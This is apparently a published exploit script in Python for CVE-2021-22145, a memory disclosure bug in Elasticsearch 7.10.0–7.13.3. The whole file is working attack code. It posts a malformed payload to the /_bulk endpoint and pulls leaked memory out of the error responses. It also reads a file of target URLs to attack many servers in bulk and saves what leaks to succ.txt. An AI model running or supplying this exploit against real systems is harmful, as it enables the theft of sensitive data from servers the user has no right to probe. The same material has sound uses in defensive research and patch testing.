# Exploit Title: ElasticSearch 7.13.3 - Memory disclosure 
# Date: 21/07/2021
# Exploit Author: r0ny
# Vendor Homepage: https://www.elastic.co/
# Software Link: https://github.com/elastic/elasticsearch
# Version: 7.10.0 to 7.13.3
# Tested on: Kali Linux
# CVE : CVE-2021-22145

#/usr/bin/python3


import requests
from packaging import version
import json
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse

result=open('succ.txt','a')

def exploit(url):
	try:
		# Prepare authentication header
		authorization_header = ""

		r = requests.get(url, headers={"Authorization": authorization_header}, verify=False,timeout=5)
		try:
			es_version = json.loads(r.content)["version"]["number"]
			print(es_version)
		except:
			pass


		#Prepare exploitation
		payload = "@\n"
		vulnerable_endpoint = "/_bulk"
		url = url + vulnerable_endpoint
		r = requests.post(url, data = payload, headers={"content-type":"application/json", "Authorization":authorization_header}, verify=False,timeout=5)

		#Read Memory Leak and remove stacktrace

		print("$$$$$$$$$$$$$$$$$$$$$$$$$")
		print("$$$$$ Memory Leaked $$$$$")
		print("$$$$$$$$$$$$$$$$$$$$$$$$$\n")
		response = json.loads(r.content)
		leak1 = response["error"]["root_cause"][0]["reason"].split("(byte[])\"")[1].split("; line")[0]
		leak2 = response["error"]["reason"].split("(byte[])\"")[1].split("; line")[0]
		print(leak1+"\n"+leak2)
		result.write(url+'\n'+leak1+"\n"+leak2)
	except:
		pass

if __name__=='__main__':
    parser = argparse.ArgumentParser(description='api help')
    parser.add_argument('-u', '--url', help='Please Input a url!', default='')
    parser.add_argument('-f', '--file', help='Please Input a file!', default='')
    args = parser.parse_args()
    url = args.url
    file = args.file
    if url!='':
        exploit(url)
    if file!="":
        f = open(file, 'r+')
        for i in f.readlines():
            url = i.strip()
            exploit(url)